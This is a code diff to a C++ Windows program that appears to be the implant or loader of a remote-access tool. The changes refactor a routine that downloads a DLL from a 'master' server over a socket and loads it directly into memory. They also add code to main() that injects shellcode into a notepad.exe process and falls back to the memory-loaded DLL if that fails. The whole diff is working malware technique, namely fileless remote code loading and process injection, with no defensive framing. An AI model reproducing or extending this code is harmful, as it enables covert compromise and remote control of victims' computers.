@@ -5,6 +5,7 @@
 #include "common/commands.h"
 #include "StdAfx.h"
 #include "MemoryModule.h"
+#include "ShellcodeInj.h"
 #include <WS2tcpip.h>
 #pragma comment(lib, "ws2_32.lib")
 
@@ -140,7 +141,7 @@ public:
 
 // Memory DLL runner.
 class MemoryDllRunner : public DllRunner {
-private:
+protected:
 	HMEMORYMODULE m_mod;
 	std::string GetIPAddress(const char* hostName)
 	{
@@ -169,8 +170,7 @@ private:
 	}
 public:
 	MemoryDllRunner() : m_mod(nullptr){}
-	// Request DLL from the master.
-	virtual void* LoadLibraryA(const char* path) {
+	virtual const char* ReceiveDll(int &size) {
 		WSADATA wsaData = {};
 		if (WSAStartup(MAKEWORD(2, 2), &wsaData))
 			return nullptr;
@@ -179,7 +179,7 @@ public:
 		char* buffer = new char[bufSize];
 		bool isFirstConnect = true;
 
-		do{
+		do {
 			if (!isFirstConnect)
 				Sleep(5000);
 
@@ -214,7 +214,7 @@ public:
 				closesocket(clientSocket);
 				continue;
 			}
-			char *ptr = buffer + sizeof(PkgHeader);
+			char* ptr = buffer + sizeof(PkgHeader);
 			int bufferSize = 16 * 1024, bytesReceived = 0, totalReceived = 0;
 			while (totalReceived < bufSize) {
 				int bytesToReceive = min(bufferSize, bufSize - totalReceived);
@@ -227,18 +227,25 @@ public:
 				continue;
 			}
 			BYTE cmd = ptr[0], type = ptr[1];
-			int size = 0;
+			size = 0;
 			memcpy(&size, ptr + 2, sizeof(int));
 			if (totalReceived != size + 6 + sizeof(PkgHeader)) {
 				continue;
 			}
-
-			m_mod = ::MemoryLoadLibrary(buffer + 6 + sizeof(PkgHeader), size);
 			closesocket(clientSocket);
 		} while (false);
 
-		SAFE_DELETE_ARRAY(buffer);
 		WSACleanup();
+		return buffer;
+	}
+	// Request DLL from the master.
+	virtual void* LoadLibraryA(const char* path) {
+		int size = 0;
+		auto buffer = ReceiveDll(size);
+		if (nullptr == buffer)
+			return nullptr;
+		m_mod = ::MemoryLoadLibrary(buffer + 6 + sizeof(PkgHeader), size);
+		SAFE_DELETE_ARRAY(buffer);
 		return m_mod;
 	}
 	virtual FARPROC GetProcAddress(void* mod, const char* lpProcName) {
@@ -263,6 +270,26 @@ int main(int argc, const char *argv[])
 	}
 	status = 0;
 	SetConsoleCtrlHandler(&callback, TRUE);
+	
+	// Try to inject shell code to `notepad.exe`
+	// If failed then run memory DLL
+	ShellcodeInj inj;
+	int pid = 0;
+	do{
+		if (sizeof(void*) == 4) // Shell code is 64bit
+			break;
+		if (!(pid = inj.InjectProcess(nullptr))) {
+			break;
+		}
+		HANDLE hProcess = OpenProcess(SYNCHRONIZE, FALSE, pid);
+		if (hProcess == NULL) {
+			break;
+		}
+		Mprintf("Inject process [%d] succeed.\n", pid);
+		DWORD waitResult = WaitForSingleObject(hProcess, INFINITE);
+		CloseHandle(hProcess);
+		Mprintf("Process [%d] is finished.\n", pid);
+	} while (pid);
 
 	do {
 		BOOL ret = Run(argc > 1 ? argv[1] : (strlen(g_ConnectAddress.ServerIP()) == 0 ? "127.0.0.1" : g_ConnectAddress.ServerIP()),
